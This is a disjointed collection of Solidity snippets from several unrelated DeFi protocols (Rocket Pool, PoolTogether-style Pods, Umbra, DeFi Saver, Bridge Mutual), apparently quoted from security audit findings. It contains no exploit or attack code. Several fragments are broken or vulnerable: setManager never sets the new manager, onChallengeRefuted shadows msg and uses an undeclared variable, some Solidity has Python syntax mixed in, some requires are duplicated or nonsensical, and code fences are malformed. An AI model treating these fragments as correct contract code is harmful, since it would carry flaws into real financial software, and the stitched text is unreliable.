"```\nfunction _upgradeContract(string memory _name, address _contractAddress, string memory _contractAbi) internal {\n    bytes32 nameHash = keccak256(abi.encodePacked(_name));\n    require(nameHash!= keccak256(abi.encodePacked(""rocketVault"")), \n        ""Cannot upgrade the vault"");\n    require(nameHash!= keccak256(abi.encodePacked(""rocketPoolToken"")), \n        ""Cannot upgrade token contracts"");\n    require(nameHash!= keccak256(abi.encodePacked(""rocketTokenRETH"")), \n        ""Cannot upgrade token contracts"");\n    require(nameHash!= keccak256(abi.encodePacked(""rocketTokenNETH"")), \n        ""Cannot upgrade token contracts"");\n    require(nameHash!= keccak256(abi.encodePacked(""casperDeposit"")), \n        ""Cannot upgrade the casper deposit contract"");\n    // Get old contract address & check contract exists\n```"
"```\nRocketDAONodeTrustedInterface rocketDAONodeTrusted = RocketDAONodeTrustedInterface(getContractAddress(""rocketDAONodeTrusted""));\n\nif (calcBase.mul(submissionCount).div(rocketDAONodeTrusted.getMemberCount()) >= \n    rocketDAOProtocolSettingsNetwork.getNodeConsensusThreshold()) {\n    setMinipoolWithdrawable(_minipoolAddress, _stakingStartBalance, _stakingEndBalance);\n}\n```\n```\nRocketDAONodeTrustedInterface rocketDAONodeTrusted = RocketDAONodeTrustedInterface(getContractAddress(""rocketDAONodeTrusted""));\n\nif (calcBase.mul(submissionCount).div(rocketDAONodeTrusted.getMemberCount()) >= rocketDAOProtocolSettingsNetwork.getNodeConsensusThreshold()) {\n    updateBalances(_block, _totalEth, _stakingEth, _rethSupply);\n}\n```\n```\nRocketDAONodeTrustedInterface rocketDAONodeTrusted = RocketDAONodeTrustedInterface(getContractAddress(""rocketDAONodeTrusted""));\n\nif (calcBase.mul(submissionCount).div(rocketDAONodeTrusted.getMemberCount()) >= rocketDAOProtocolSettingsNetwork.getNodeConsensusThreshold()) {\n    updatePrices(_block, _rplPrice);\n}\n```"
"```\nbytes32 nodeSubmissionKey = keccak256(abi.encodePacked(""minipool.withdrawable.submitted.node"", msg.sender, _minipoolAddress, _stakingStartBalance, _stakingEndBalance));\nbytes32 submissionCountKey = keccak256(abi.encodePacked(""minipool.withdrawable.submitted.count"", _minipoolAddress, _stakingStartBalance, _stakingEndBalance));\n\nrequire(!getBool(nodeSubmissionKey), ""Duplicate submission from node"");\nsetBool(nodeSubmissionKey, true);\nsetBool(keccak256(abi.encodePacked(""minipool.withdrawable.submitted.node"", msg.sender, _minipoolAddress)), true);\n\nuint256 submissionCount = getUint(submissionCountKey).add(1);\nsetUint(submissionCountKey, submissionCount);\n```\n```\n// Get submission keys\nbytes32 nodeSubmissionKey = keccak256(abi.encodePacked(""network.balances.submitted.node"", msg.sender, _block, _totalEth, _stakingEth, _rethSupply));\nbytes32 submissionCountKey = keccak256(abi.encodePacked(""network.balances.submitted.count"", _block, _totalEth, _stakingEth, _rethSupply));\n\nrequire(!getBool(nodeSubmissionKey), ""Duplicate submission from node"");\nsetBool(nodeSubmissionKey, true);\nsetBool(keccak256(abi.encodePacked(""network.balances.submitted.node"", msg.sender, _block)), true);\n\nuint256 submissionCount = getUint(submissionCountKey).add(1);\nsetUint(submissionCountKey, submissionCount);\n\nemit BalancesSubmitted(msg.sender, _block, _totalEth, _stakingEth, _rethSupply, block.timestamp);\n\n// Check submission count & update network balances\n```\n```\nbytes32 nodeSubmissionKey = keccak256(abi.encodePacked(""network.prices.submitted.node"", msg.sender, _block, _rplPrice));\nbytes32 submissionCountKey = keccak256(abi.encodePacked(""network.prices.submitted.count"", _block, _rplPrice));\n\nrequire(!getBool(nodeSubmissionKey), ""Duplicate submission from node"");\nsetBool(nodeSubmissionKey, true);\nsetBool(keccak256(abi.encodePacked(""network.prices.submitted.node"", msg.sender, _block)), true);\n\nuint256 submissionCount = getUint(submissionCountKey).add(1);\nsetUint(submissionCountKey, submissionCount);\n\nemit PricesSubmitted(msg.sender, _block, _rplPrice, block.timestamp);\n\n// Check submission count & update network prices\n```"
"```\nif (calcBase.mul(submissionCount).div(rocketDAONodeTrusted.getMemberCount()) >= \n    rocketDAOProtocolSettingsNetwork.getNodeConsensusThreshold()) {\n    setMinipoolWithdrawable(_minipoolAddress, _stakingStartBalance, _stakingEndBalance);\n}\n```\n```\nuint256 nodeAmount = getMinipoolNodeRewardAmount(\n    minipool.getNodeFee(),\n    userDepositBalance,\n    minipool.getStakingStartBalance(),\n    minipool.getStakingEndBalance()\n);\n\nif (nodeAmount > 0) {\n    rocketTokenNETH.mint(nodeAmount, _minipoolAddress);\n}\n```\n```\nreceive() external payable {\n    (bool success, bytes memory data) = getContractAddress(""rocketMinipoolDelegate"").delegatecall(abi.encodeWithSignature(""receiveValidatorBalance()""));\n    if (!success) {\n        revert(getRevertMessage(data));\n    }\n}\n```\n```\nrequire(msg.sender == rocketDAOProtocolSettingsNetworkInterface.getSystemWithdrawalContractAddress(), ""The minipool's validator balance can only be sent by the eth1 system withdrawal contract"");\n\nrequire(msg.sender == rocketDAOProtocolSettingsNetworkInterface.getSystemWithdrawalContractAddress(), ""The minipool's validator balance can only be sent by the eth1 system withdrawal contract"");\nvalidatorBalanceWithdrawn = true;\nrocketNetworkWithdrawal.processWithdrawal{value: msg.value}();\n```\n```\nuint256 totalShare = rocketMinipoolManager.getMinipoolWithdrawalTotalBalance(msg.sender);\nuint256 nodeShare = rocketMinipoolManager.getMinipoolWithdrawalNodeBalance(msg.sender);\nuint256 userShare = totalShare.sub(nodeShare);\n\nuint256 nodeAmount = 0;\nuint256 userAmount = 0;\n\nif (totalShare > 0) {\n    nodeAmount = msg.value.mul(nodeShare).div(totalShare);\n    userAmount = msg.value.mul(userShare).div(totalShare);\n}\n\nrocketMinipoolManager.setMinipoolWithdrawalProcessed(msg.sender);\n\nif (nodeAmount > 0) {\n    rocketTokenNETH.depositRewards{value: nodeAmount}();\n}\n\n// Transfer user balance to rETH contract or deposit pool\n```\n```\nuint256 nethBalance = rocketTokenNETH.balanceOf(address(this));\nif (nethBalance > 0) {\n    RocketNodeManagerInterface rocketNodeManager = RocketNodeManagerInterface(getContractAddress(""rocketNodeManager""));\n    address nodeWithdrawalAddress = rocketNodeManager.getNodeWithdrawalAddress(nodeAddress);\n    require(rocketTokenNETH.transfer(nodeWithdrawalAddress, nethBalance), ""nETH balance was not successfully transferred to node operator"");\n    emit NethWithdrawn(nodeWithdrawalAddress, nethBalance, block.timestamp);\n}\n```\n```\nfunction depositRewards() override external payable onlyLatestContract(""rocketNetworkWithdrawal"", msg.sender) {\n    emit EtherDeposited(msg.sender, msg.value, block.timestamp);\n}\n\nfunction mint(uint256 _amount, address _to) override external onlyLatestContract(""rocketMinipoolStatus"", msg.sender) {\n    require(_amount > 0, ""Invalid token mint amount"");\n    _mint(_to, _amount);\n    emit TokensMinted(_to, _amount, block.timestamp);\n}\n```"
"```\nfunction destroy() private {\n    RocketMinipoolManagerInterface rocketMinipoolManager = \n        RocketMinipoolManagerInterface(getContractAddress(""rocketMinipoolManager""));\n    rocketMinipoolManager.destroyMinipool();\n    selfdestruct(payable(getContractAddress(""rocketVault"")));\n}\n```"
"```\nreturn MemberDetails{\n    Address: memberAddress,\n    Exists: exists,\n    ID: id,\n    Email: email,\n    JoinedBlock: joinedBlock,\n    LastProposalBlock: lastProposalBlock,\n    RPLBondAmount: rplBondAmount,\n    UnbondedValidatorCount: unbondedValidatorCount,\n}, nil\n```\n```\nfunction getMemberEmail(address _nodeAddress) override public view returns (string memory) {\n    return getString(keccak256(abi.encodePacked(daoNameSpace, ""member.email"", _nodeAddress)));\n}\n```"
"```\nfunction getContractAddress(string memory _contractName) private view returns (address) {\n    return rocketStorage.getAddress(keccak256(abi.encodePacked(""contract.address"", _contractName)));\n}\n```\n```\nfunction getContractAddress(string memory _contractName) private view returns (address) {\n    return rocketStorage.getAddress(keccak256(abi.encodePacked(""contract.address"", _contractName)));\n}\n```\n```\nfunction getContractAddress(string memory _contractName) internal view returns (address) {\n    address contractAddress = getAddress(keccak256(abi.encodePacked(""contract.address"", _contractName)));\n    require(contractAddress!= address(0x0), ""Contract not found"");\n    return contractAddress;\n}"
"```\nfunction onChallengeRefuted(address _nodeAddress, bytes32 msg) public {\n    // Allow the challenged member to refute the challenge at anytime. If the window has passed and the challenge node does not run this method, any member can decide the challenge and eject the absent member\n\n    if (_nodeAddress == msg.sender) {\n        // Challenge is defeated, node has responded\n        deleteUint(keccak256(abi.encodePacked(daoNameSpace, ""member.challenged.block"", _nodeAddress)));\n    } else {\n        // The challenge refute window has passed, the member can be ejected now\n        if (getUint(keccak256(abi.encodePacked(daoNameSpace, ""member.challenged.block"", _nodeAddress))).add(rocketDAONodeTrustedSettingsMembers.getChallengeWindow()) < block.number) {\n            // Node has been challenged and failed to respond in the given window, remove them as a member and their bond is burned\n            _memberRemove(_nodeAddress);\n            // Challenge was successful\n            challengeSuccess = true;\n        }\n    }\n    // Log it\n    emit ActionChallengeDecided(_nodeAddress, msg.sender, challengeSuccess, block.timestamp);\n}\n```"
"```\nenum ProposalType {\n    Invite,  # Invite a registered node to join the trusted node DAO\n    Leave,   # Leave the DAO\n    Replace, # Replace a current trusted node with a new registered node, they take over their bond\n    Kick,    # Kick a member from the DAO with optional penalty applied to their RPL deposit\n    Setting  # Change a DAO setting (Quorum threshold, RPL deposit size, voting periods etc)\n}\n```\nenum ProposalType {\n    Setting  # Change a DAO setting (Node operator min/max fees, inflation rate etc)\n}"
"```\nevent MemberJoined(\n    address indexed _nodeAddress,\n    uint256 _rplBondAmount,\n    uint256 time\n);\n\nevent MemberLeave(\n    address indexed _nodeAddress,\n    uint256 _rplBondAmount,\n    uint256 time\n);\n```"
"```\n} else {\n    if votesFor <= votesAgainst or votesFor < getVotesRequired(_proposalID):\n        return ProposalState.Defeated\n```\n```\nfunction cancel(address _member, uint256 _proposalID) override public onlyDAOContract(getDAO(_proposalID)) {\n    require(getState(_proposalID)!= ProposalState.Executed, ""Proposal has already been executed"");\n    require(getState(_proposalID)!= ProposalState.Succeeded, ""Proposal has already succeeded"");\n    require(getProposer(_proposalID) == _member, ""Proposal can only be cancelled by the proposer"");\n    setBool(keccak256(abi.encodePacked(daoProposalNameSpace, ""cancelled"", _proposalID)), true);\n    emit ProposalCancelled(_proposalID, _member, block.timestamp);\n}\n```"
```\nif (getCancelled(_proposalID)) {\n    if (getCancelled(_proposalID)) {\n        return ProposalState.Cancelled;\n    }\n} else if (getExecuted(_proposalID)) {\n    return ProposalState.Executed;\n} else if (block.number >= getExpires(_proposalID)) {\n    return ProposalState.Expired;\n} else if (votesFor >= getVotesRequired(_proposalID)) {\n    return ProposalState.Succeeded;\n} else if (block.number <= getStart(_proposalID)) {\n    return ProposalState.Pending;\n} else if (block.number <= getEnd(_proposalID)) {\n    return ProposalState.Active;\n} else {\n    return ProposalState.Defeated;\n}\n```
"```\nfunction registerClaimer(address _claimerAddress, bool _enabled) override external onlyClaimContract {\n    string memory contractName = getContractName(msg.sender);\n    uint256 registeredBlock = 0;\n    uint256 claimersIntervalTotalUpdate = getClaimingContractUserTotalNext(contractName);\n\n    if (_enabled) {\n        require(getClaimingContractUserRegisteredBlock(contractName, _claimerAddress) == 0, ""Claimer is already registered"");\n        registeredBlock = block.number;\n        claimersIntervalTotalUpdate = claimersIntervalTotalUpdate.add(1);\n    } else {\n        claimersIntervalTotalUpdate = claimersIntervalTotalUpdate.sub(1);\n    }\n\n    setUint(keccak256(abi.encodePacked(""rewards.pool.claim.interval.claimers.total.next"", contractName)), claimersIntervalTotalUpdate);\n    setUint(keccak256(abi.encodePacked(""rewards.pool.claim.contract.registered.block"", contractName, _claimerAddress)), registeredBlock);\n}"
"```\nrequire(_block.getPricesBlock(), ""Network prices for an equal or higher block are set"")\n```"
```\nfor (uint256 i = 0; i < rocketDAOProtocolSettingsDeposit.getMaximumDepositAssignments(); ++i) {\n    getAndCheckNextAvailableMinipoolCapacity();\n}\n```
```\nuint256 totalShare = rocketMinipoolManager.getMinipoolWithdrawalTotalBalance(msg.sender);\nuint256 nodeShare = rocketMinipoolManager.getMinipoolWithdrawalNodeBalance(msg.sender);\nuint256 userShare = totalShare.sub(nodeShare);\n\nuint256 nodeAmount = 0;\nuint256 userAmount = 0;\n\nif (totalShare > 0) {\n    nodeAmount = msg.value.mul(nodeShare).div(totalShare);\n    userAmount = msg.value.mul(userShare).div(totalShare);\n}\n```
```\nfunction getLotPriceByTotalBids(uint256 _index) override public view returns (uint256) {\n    uint256 calcBase = 1 ether;\n    return calcBase.mul(getLotTotalBidAmount(_index)).div(getLotTotalRPLAmount(_index));\n}\n```\n```\nfunction getLotClaimedRPLAmount(uint256 _index) override public view returns (uint256) {\n    uint256 calcBase = 1 ether;\n    return calcBase.mul(getLotTotalBidAmount(_index)).div(getLotCurrentPrice(_index));\n}\n```\n```\nuint256 calcBase = 1 ether;\n```\nuint256 bidAmount = msg.value;\nuint256 calcBase = 1 ether;\n```\n```\nuint256 calcBase = 1 ether;\nuint256 rplAmount = calcBase.mul(bidAmount).div(currentPrice);\n```
"```\nfunction getMemberAt(uint256 _index) override public view returns (address) {\n    AddressSetStorageInterface addressSetStorage = AddressSetStorageInterface(getContractAddress(""addressSetStorage""));\n    return addressSetStorage.getItem(keccak256(abi.encodePacked(daoNameSpace, ""member.index"")), _index);\n}\n```\n```\nstring private daoNameSpace = 'dao.trustednodes';\n```\nuint256 private calcBase = 1 ether;\n\nstring private daoNameSpace = 'dao.trustednodes';\n```\n```\nstring private daoNameSpace = 'dao.protocol';\n```"
"```\nfunction depositEther() override external payable onlyLatestNetworkContract {\n    bytes32 contractKey = keccak256(abi.encodePacked(getContractName(msg.sender)));\n    etherBalances[contractKey] = etherBalances[contractKey].add(msg.value);\n    emit EtherDeposited(contractKey, msg.value, block.timestamp);\n}\n```"
"```\nemit TokenDeposited(contractKey, _tokenAddress, _amount, block.timestamp);\nreturn true;\n```\nemit TokenWithdrawn(contractKey, _tokenAddress, _amount, block.timestamp);\n\nreturn true;\n```\n```\nemit TokenTransfer(\n    contractKeyFrom,\n    contractKeyTo,\n    _tokenAddress,\n    _amount,\n    block.timestamp\n);\n\nreturn true;\n```\nrocketVault.depositToken(""rocketNodeStaking"", rplTokenAddress, _amount);\nrocketVault.updateRPLStakeAmounts();\nrocketVault.updateNodeRPLStakedBlock();\n```\nrocketVault.withdrawToken(\n    msg.sender,\n    getContractAddress(""rocketTokenRPL""),\n    rplAmount\n)\n```\nrocketVault.withdrawToken(\n    msg.sender,\n    getContractAddress(""rocketTokenRPL""),\n    _amount\n)\n```\nrocketVault.transferToken(\n    ""rocketAuctionManager"",\n    getContractAddress(""rocketTokenRPL""),\n    rplSlashAmount\n)"
"```\nconstructor(address _rocketStorageAddress) {\n    require(_rocketStorageAddress!= address(0x0), ""Invalid storage address"");\n    rocketStorage = RocketStorageInterface(_rocketStorageAddress);\n}\n```"
"```\nfunction distributeAllNFT() external {\n    require(block.timestamp > getEndLMTime(), ""2 weeks after liquidity mining time has not expired"");\n    require(!isNFTDistributed, ""NFT is already distributed"");\n\n    for (uint256 i = 0; i < leaderboard.length; i++) {\n        address[] memory groupLeaders = groupsLeaders[leaderboard[i]];\n\n        for (uint256 j = 0; j < groupLeaders.length; j++) {\n            _sendNFT(j, groupLeaders[j]);\n        }\n    }\n\n    for (uint256 i = 0; i < topUsers.length; i++) {\n        address currentAddress = topUsers[i];\n        LMNFT.safeTransferFrom(address(this), currentAddress, 1, 1, """");\n        emit NFTSent(currentAddress, 1);\n    }\n\n    isNFTDistributed = true;\n}\n```"
"```\nfunction depositTo(address to, uint256 tokenAmount)\n    external\n    override\n    returns (uint256)\n{\n    require(tokenAmount > 0, ""Pod:invalid-amount"");\n\n    uint256 shares = _deposit(to, tokenAmount);\n\n    IERC20Upgradeable(token).transferFrom(\n        msg.sender,\n        address(this),\n        tokenAmount\n    );\n\n    emit Deposited(to, tokenAmount, shares);\n\n    return shares;\n}\n```"
"```\nfunction initialize(address _measure, address _asset) external {\n    measure = IERC20Upgradeable(_measure);\n    asset = IERC20Upgradeable(_asset);\n\n    factory = msg.sender;\n}\n```"
"```\nuint256 shares = _deposit(to, tokenAmount);\n\nIERC20Upgradeable(token).transferFrom(\n    msg.sender,\n    address(this),\n    tokenAmount\n);\n```"
"```\nfunction claim(address user) external returns (uint256) {\n    drop();\n    _captureNewTokensForUser(user);\n    uint256 balance = userStates[user].balance;\n    userStates[user].balance = 0;\n    totalUnclaimed = uint256(totalUnclaimed).sub(balance).toUint112();\n\n    asset.transfer(user, balance);\n\n    emit Claimed(user, balance);\n\n    return balance;\n}\n```"
"```\nfunction setTokenDrop(address _token, address _tokenDrop)\n    external\n    returns (bool)\n{\n    require(\n        msg.sender == factory || msg.sender == owner(),\n        ""Pod:unauthorized-set-token-drop""\n    );\n\n    require(\n        drops[_token] == TokenDrop(0),\n        ""Pod:target-tokendrop-mapping-exists""\n    );\n\n    drop = TokenDrop(_tokenDrop);\n\n    drops[_token] = drop;\n\n    return true;\n}\n```"
```\nif (amount > currentBalance) {\n    uint256 _withdraw = amount.sub(currentBalance);\n\n    uint256 exitFee = _withdrawFromPool(_withdraw);\n\n    amount = amount.sub(exitFee);\n}\n```
"```\nfunction setManager(address newManager)\n    public\n    virtual\n    onlyOwner\n    returns (bool)\n{\n    require(address(manager)!= address(0), ""Pod:invalid-manager-address"");\n}\n```"
"```\nfunction _validateWithdrawSignature(\n    address _stealthAddr,\n    address _acceptor,\n    address _tokenAddr,\n    address _sponsor,\n    uint256 _sponsorFee,\n    IUmbraHookReceiver _hook,\n    bytes memory _data,\n    uint8 _v,\n    bytes32 _r,\n    bytes32 _s\n) internal view {\n    bytes32 _digest = keccak256(\n        abi.encodePacked(\n            ""\x19Ethereum Signed Message: 32"",\n            keccak256(abi.encode(\n                chainId,\n                version,\n                _acceptor,\n                _tokenAddr,\n                _sponsor,\n                _sponsorFee,\n                address(_hook),\n                _data\n            ))\n        )\n    );\n\n    address _recoveredAddress = ecrecover(_digest, _v, _r, _s);\n    require(_recoveredAddress!= address(0) && _recoveredAddress == _stealthAddr, ""Umbra: Invalid Signature"");\n}\n```"
"```\nfunction executeOperation(\n    address[] memory _assets,\n    uint256[] memory _amounts,\n    uint256[] memory _fees,\n    address _initiator,\n    bytes memory _params\n) public returns (bool) {\n    require(msg.sender == AAVE_LENDING_POOL, ""ERR_ONLY_AAVE_CALLER"");\n    require(_initiator == address(this), ""ERR_SAME_CALLER"");\n\n    (Task memory currTask, address proxy) = abi.decode(_params, (Task, address));\n\n    // Send FL amounts to user proxy\n    for (uint256 i = 0; i < _assets.length; i++) {\n        _assets[i].withdrawTokens(proxy, _amounts[i]);\n    }\n\n    address payable taskExecutor = payable(registry.getAddr(TASK_EXECUTOR_ID));\n\n    // call Action execution\n    IDSProxy(proxy).execute{value: address(this).balance}(\n        taskExecutor,\n        abi.encodeWithSelector(CALLBACK_SELECTOR, currTask, bytes32(_amounts[0] + _fees[0]))\n    );\n\n    // return FL\n    for (uint256 i = 0; i < _assets.length; i++) {\n        _assets[i].approveToken(address(AAVE_LENDING_POOL), _amounts[i] + _fees[i]);\n    }\n\n    return true;\n}\n```"
"```\nfunction getSellRate(\n    address _srcAddr,\n    address _destAddr,\n    uint _srcAmount,\n    bytes memory\n) public override view returns (uint rate) {\n    (rate, ) = KyberNetworkProxyInterface(KYBER_INTERFACE)\n       .getExpectedRate(IERC20(_srcAddr), IERC20(_destAddr), _srcAmount);\n\n    rate = rate * (10 ** (18 - getDecimals(_srcAddr)));\n    rate = rate / (10 ** (18 - getDecimals(_destAddr)));\n}\n```"
```\nfunction enterMarket(address _cTokenAddr) public {\n    address[] memory markets = new address[](1);\n    markets[0] = _cTokenAddr;\n\n    IComptroller(COMPTROLLER_ADDR).enterMarkets(markets);\n}\n\nfunction exitMarket(address _cTokenAddr) public {\n    IComptroller(COMPTROLLER_ADDR).exitMarket(_cTokenAddr);\n}\n```
"```\nfunction pullTokens(\n    address _token,\n    address _from,\n    uint256 _amount\n) internal returns (uint256) {\n    if (_amount == type(uint256).max) {\n        uint256 allowance = IERC20(_token).allowance(address(this), _from);\n        uint256 balance = getBalance(_token, _from);\n\n        _amount = (balance > allowance)? allowance : balance;\n    }\n\n    if (_from!= address(0) && _from!= address(this) && _token!= ETH_ADDR && _amount!= 0) {\n        IERC20(_token).safeTransferFrom(_from, address(this), _amount);\n    }\n\n    return _amount;\n}"
"```\nfunction getSellRate(address _srcAddr, address _destAddr, uint _srcAmount, bytes memory) public override view returns (uint rate) {\n    (rate,) = KyberNetworkProxyInterface(KYBER_INTERFACE)\n       .getExpectedRate(IERC20(_srcAddr), IERC20(_destAddr), _srcAmount);\n\n    rate = rate * (10 ** (18 - getDecimals(_srcAddr)));\n    rate = rate / (10 ** (18 - getDecimals(_destAddr)));\n}\n\nfunction getBuyRate(address _srcAddr, address _destAddr, uint _destAmount, bytes memory _additionalData) public override view returns (uint rate) {\n    uint256 srcRate = getSellRate(_destAddr, _srcAddr, _destAmount, _additionalData);\n    uint256 srcAmount = wmul(srcRate, _destAmount);\n\n    rate = getSellRate(_srcAddr, _destAddr, srcAmount, _additionalData);\n\n    rate = rate + (rate / 30);\n}\n```"
"```\nfunction _sell(ExchangeData memory exData) internal returns (address, uint256) {\n    uint256 amountWithoutFee = exData.srcAmount;\n    address wrapper = exData.offchainData.wrapper;\n    bool offChainSwapSuccess;\n\n    uint256 destBalanceBefore = exData.destAddr.getBalance(address(this));\n\n    exData.srcAmount -= getFee(\n        exData.srcAmount,\n        exData.user,\n        exData.srcAddr,\n        exData.dfsFeeDivider\n    );\n\n    if (exData.offchainData.price > 0) {\n        (offChainSwapSuccess, ) = offChainSwap(exData, ExchangeActionType.SELL);\n    }\n\n    if (!offChainSwapSuccess) {\n        onChainSwap(exData, ExchangeActionType.SELL);\n        wrapper = exData.wrapper;\n    }\n\n    uint256 destBalanceAfter = exData.destAddr.getBalance(address(this));\n    uint256 amountBought = sub(destBalanceAfter, destBalanceBefore);\n\n    require(amountBought >= wmul(exData.minPrice, exData.srcAmount), ERR_SLIPPAGE_HIT);\n\n    exData.srcAmount = amountWithoutFee;\n\n    return (wrapper, amountBought);\n}\n```\n```\nfunction _buy(ExchangeData memory exData) internal returns (address, uint256) {\n    require(exData.destAmount!= 0, ERR_DEST_AMOUNT_MISSING);\n\n    uint256 amountWithoutFee = exData.srcAmount;\n    address wrapper = exData.offchainData.wrapper;\n    bool offChainSwapSuccess;\n\n    uint256 destBalanceBefore = exData.destAddr.getBalance(address(this));\n\n    exData.srcAmount -= getFee(\n        exData.srcAmount,\n        exData.user,\n        exData.srcAddr,\n        exData.dfsFeeDivider\n    );\n\n    if (exData.offchainData.price > 0) {\n        (offChainSwapSuccess, ) = offChainSwap(exData, ExchangeActionType.BUY);\n    }\n\n    if (!offChainSwapSuccess) {\n        onChainSwap(exData, ExchangeActionType.BUY);\n        wrapper = exData.wrapper;\n    }\n\n    uint256 destBalanceAfter = exData.destAddr.getBalance(address(this));\n    uint256 amountBought = sub(destBalanceAfter, destBalanceBefore);\n\n    require(amountBought >= exData.destAmount, ERR_SLIPPAGE_HIT);\n\n    exData.srcAmount = amountWithoutFee;\n\n    return (wrapper, amountBought);\n}\n```"
"```\nfunction _borrow(\n    address _market,\n    address _tokenAddr,\n    uint256 _amount,\n    uint256 _rateMode,\n    address _to,\n    address _onBehalf\n) internal returns (uint256) {\n    ILendingPoolV2 lendingPool = getLendingPool(_market);\n\n    if (_onBehalf == address(0)) {\n        _onBehalf = address(this);\n    }\n\n    lendingPool.borrow(_tokenAddr, _amount, _rateMode, AAVE_REFERRAL_CODE, _onBehalf);\n\n    _tokenAddr.withdrawTokens(_to, _amount);\n\n    logger.Log(\n        address(this),\n        msg.sender,\n        ""AaveBorrow"",\n        abi.encode(_market, _tokenAddr, _amount, _rateMode, _to, _onBehalf)\n    );\n\n    return _amount;\n}\n```\n```\nfunction withdrawTokens(\n    address _token,\n    address _to,\n    uint256 _amount\n) internal returns (uint256) {\n    if (_amount == type(uint256).max) {\n        _amount = getBalance(_token, address(this));\n    }\n```"
"```\nfunction mintNFTsForLM(address _liquidiyMiningAddr) external {\n    uint256[] memory _ids = new uint256[](NFT_TYPES_COUNT);\n    uint256[] memory _amounts = new uint256[](NFT_TYPES_COUNT);\n\n    _ids[0] = 1;\n    _amounts[0] = 5;\n\n    _ids[1] = 2;\n    _amounts[1] = LEADERBOARD_SIZE;\n\n    _ids[2] = 3;\n    _amounts[2] = 3 * LEADERBOARD_SIZE;\n\n    _ids[3] = 4;\n    _amounts[3] = 6 * LEADERBOARD_SIZE;\n\n    _mintBatch(_liquidiyMiningAddr, _ids, _amounts, """");\n}\n```"
"```\nfunction requestWithdrawal(uint256 _tokensToWithdraw) external override {\n    WithdrawalStatus _status = getWithdrawalStatus(msg.sender);\n\n    require(_status == WithdrawalStatus.NONE || _status == WithdrawalStatus.EXPIRED,\n        ""PB: Can't request withdrawal"");\n\n    uint256 _daiTokensToWithdraw = _tokensToWithdraw.mul(getDAIToDAIxRatio()).div(PERCENTAGE_100);\n    uint256 _availableDaiBalance = balanceOf(msg.sender).mul(getDAIToDAIxRatio()).div(PERCENTAGE_100);\n\n    if (block.timestamp < liquidityMining.getEndLMTime().add(neededTimeAfterLM)) {\n        _availableDaiBalance = _availableDaiBalance.sub(liquidityFromLM[msg.sender]);\n    }\n\n    require(totalLiquidity >= totalCoverTokens.add(_daiTokensToWithdraw),\n        ""PB: Not enough liquidity"");\n\n    require(_availableDaiBalance >= _daiTokensToWithdraw, ""PB: Wrong announced amount"");\n\n    WithdrawalInfo memory _newWithdrawalInfo;\n    _newWithdrawalInfo.amount = _tokensToWithdraw;\n    _newWithdrawalInfo.readyToWithdrawDate = block.timestamp.add(withdrawalPeriod);\n\n    withdrawalsInfo[msg.sender] = _newWithdrawalInfo;\n    emit RequestWithdraw(msg.sender, _tokensToWithdraw, _newWithdrawalInfo.readyToWithdrawDate);\n}\n```\n```\nfunction withdrawLiquidity() external override {\n    require(getWithdrawalStatus(msg.sender) == WithdrawalStatus.READY, ""PB: Withdrawal is not ready"");\n\n    uint256 _tokensToWithdraw = withdrawalsInfo[msg.sender].amount;\n    uint256 _daiTokensToWithdraw = _tokensToWithdraw.mul(getDAIToDAIxRatio()).div(PERCENTAGE_100);\n\n    if (withdrawalQueue.length!= 0 || totalLiquidity.sub(_daiTokensToWithdraw) < totalCoverTokens) {\n        withdrawalQueue.push(msg.sender);\n    } else {\n        _withdrawLiquidity(msg.sender, _tokensToWithdraw);\n    }\n}\n```\n```\nrequire(totalLiquidity >= totalCoverTokens.add(_daiTokensToWithdraw),\n  ""PB: Not enough liquidity"")\n\nrequire(_availableDaiBalance >= _daiTokensToWithdraw, ""PB: Wrong announced amount"")\n```\n```\nwithdrawalPeriod = 1 * weeks;\nwithdrawalExpirePeriod = 2 * days;\n```"
"```\nfunction buyPolicyFor(\n    address _policyHolderAddr,\n    uint256 _epochsNumber,\n    uint256 _coverTokens\n) external override {\n    _buyPolicyFor(_policyHolderAddr, _epochsNumber, _coverTokens);\n}\n```\n```\nfunction addLiquidityFor(\n    address _liquidityHolderAddr,\n    uint256 _liquidityAmount\n) external override {\n    _addLiquidityFor(_liquidityHolderAddr, _liquidityAmount, false);\n}\n```"
"```\ncontract LiquidityMining is ILiquidityMining, ERC1155Receiver, Ownable {\n}\n```\nfunction onERC1155Received(\n    address operator,\n    address from,\n    address to,\n    uint256 id,\n    uint256 value,\n    bytes calldata data\n) external {\n    //... rest of the code\n}\n```\nfunction onERC1155BatchReceived(\n```\n```\nfunction onERC1155Received(\n    address operator,\n    address from,\n    uint256 id,\n    uint256 value,\n    bytes memory data\n)\n    external\n    pure\n    override\n    returns(bytes4)\n{\n    return bytes4(keccak256(""onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)""));\n}\n```"
"```\nfunction _stakeDAIx(address _user, uint256 _amount, address _policyBookAddr) internal {\n    require(_amount > 0, ""BMIDAIStaking: Can't stake zero tokens"");\n\n    PolicyBook _policyBook = PolicyBook(_policyBookAddr);\n    // transfer DAI from PolicyBook to yield generator\n    daiToken.transferFrom(_policyBookAddr, address(defiYieldGenerator), _amount);\n\n    // transfer bmiDAIx from user to staking\n    _policyBook.transferFrom(_user, address(this), _amount);\n\n    _mintNFT(_user, _amount, _policyBook);\n}\n```"
"```\nfunction _updateWithdrawalQueue() internal {\n    uint256 _availableLiquidity = totalLiquidity.sub(totalCoverTokens);\n    uint256 _countToRemoveFromQueue;\n\n    for (uint256 i = 0; i < withdrawalQueue.length; i++) {\n        uint256 _tokensToWithdraw = withdrawalsInfo[withdrawalQueue[i]].amount;\n        uint256 _amountInDai = _tokensToWithdraw.mul(getDAIToDAIxRatio()).div(PERCENTAGE_100);\n\n        if (balanceOf(withdrawalQueue[i]) < _tokensToWithdraw) {\n            _countToRemoveFromQueue++;\n            continue;\n        }\n\n        if (_availableLiquidity >= _amountInDai) {\n            _withdrawLiquidity(withdrawalQueue[i], _tokensToWithdraw);\n            _availableLiquidity = _availableLiquidity.sub(_amountInDai);\n            _countToRemoveFromQueue++;\n        } else {\n            break;\n        }\n    }\n\n    _removeFromQueue(_countToRemoveFromQueue);\n}\n```"
"```\nfunction approveAllDaiTokensForStakingAndVotingAndTransferOwnership() internal {\n    daiToken.approve(address(bmiDaiStaking), uint256(MAX_INT));\n    daiToken.approve(address(claimVoting), uint256(MAX_INT));\n\n    transferOwnership(address(bmiDaiStaking));\n}\n```"
